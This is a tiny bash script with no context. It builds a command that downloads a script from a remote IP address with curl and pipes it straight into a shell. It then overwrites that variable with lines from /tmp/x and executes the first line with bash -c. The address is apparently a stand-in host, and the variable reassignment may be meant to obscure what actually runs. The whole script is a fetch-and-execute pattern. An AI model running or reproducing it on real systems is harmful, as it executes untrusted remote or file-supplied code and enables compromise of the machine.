#!/bin/bash
c="curl -fsSL http://203.0.113.5/i.sh | sh"
mapfile -t c < /tmp/x
bash -c "$c"
